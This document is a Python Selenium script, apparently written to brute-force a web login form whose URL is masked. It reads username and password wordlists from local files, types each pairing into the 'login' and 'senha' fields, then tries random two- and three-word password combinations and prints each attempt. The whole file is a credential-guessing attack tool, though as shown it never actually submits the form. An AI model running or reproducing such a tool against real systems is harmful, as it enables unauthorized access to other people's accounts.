from unittest import expectedFailure
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys 
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
import random

driver = webdriver.Chrome(ChromeDriverManager().install())
driver.maximize_window()
driver.implicitly_wait(20)
driver.get('https://xxxxxxxxxxx')

with open('/home/whoami/Desktop/pyscripts/user.txt', 'r') as user:
    linhasuser = sum(1 for line in user)
with open('/home/whoami/Desktop/pyscripts/pass.txt', 'r') as senhas:
    linhaspass = sum(1 for line in senhas)

uuserr = open("/home/whoami/Desktop/pyscripts/user.txt", "r")
ssenhass = open("/home/whoami/Desktop/pyscripts/pass.txt", "r")
conteudouser = uuserr.readlines()
conteudopass = ssenhass.readlines()

usercounter = 0
passcounter = 0
usercounterdois = 0

x = 0
while x == 0: 
    try:
        if usercounter == linhasuser and passcounter == linhaspass:
            usercounterdois = linhasuser

        driver.find_element_by_xpath('//*[@id="login"]').clear()
        driver.find_element_by_xpath('//*[@id="senha"]').clear()
        usuario = conteudouser[usercounter]
        driver.find_element_by_xpath('//*[@id="login"]').send_keys(usuario.rstrip('\n'))
        driver.find_element_by_xpath('//*[@id="senha"]').send_keys(conteudopass[passcounter])
    except IndexError:
        usercounter = usercounter + 1
        passcounter = 0
    try:
        print(conteudouser[usercounter],'->',conteudopass[passcounter])
        passcounter = passcounter + 1 
    except IndexError:
        usercounterdois = linhasuser
    #except:
     #   print(conteudouser[usercounter],'->',conteudopass[passcounter])
      #  passcounter = passcounter + 1

    if usercounterdois == linhasuser:
        usercounter = 0
        while usercounterdois == linhasuser:
            potencia = linhaspass ** linhaspass
            terceiro = potencia * linhaspass
            trescounter = 0
            o = 0
            counter = 0
            while counter < potencia:
                try:
                    trescounter = trescounter + 1
                    counter = counter + 1
                    y = random.randrange(0, linhaspass)
                    z = random.randrange(0, linhaspass)
                    doublepass = conteudopass[y].rstrip('\n')+conteudopass[z].rstrip('\n')
                    driver.find_element_by_xpath('//*[@id="login"]').clear()
                    driver.find_element_by_xpath('//*[@id="senha"]').clear()
                    driver.find_element_by_xpath('//*[@id="senha"]').send_keys(doublepass)
                    driver.find_element_by_xpath('//*[@id="login"]').send_keys(conteudouser[usercounter])
                    print(conteudouser[usercounter],'->',doublepass)
                except IndexError:
                    usercounter = usercounter + 1
                    counter = 0
                if counter == potencia:
                    usercounter = usercounter + 1
                    counter = 0
                if trescounter == terceiro:
                    usercounter = 0
                    while o < terceiro:
                        try:
                            o = o + 1
                            y = random.randrange(0, linhaspass)
                            z = random.randrange(0, linhaspass)
                            u = random.randrange(0, linhaspass)
                            driver.find_element_by_xpath('//*[@id="login"]').clear()
                            driver.find_element_by_xpath('//*[@id="senha"]').clear()
                            triplepass = conteudopass[y].rstrip('\n')+conteudopass[z].rstrip('\n')+conteudopass[u].rstrip('\n')
                            driver.find_element_by_xpath('//*[@id="senha"]').send_keys(triplepass)
                            driver.find_element_by_xpath('//*[@id="login"]').send_keys(conteudouser[usercounter])
                            print(conteudouser[usercounter],'->',triplepass)
                        except IndexError:
                            usercounter = usercounter + 1
                            o = 0
                        if o == terceiro:
                            o = 0
                            usercounter = usercounter + 1




                






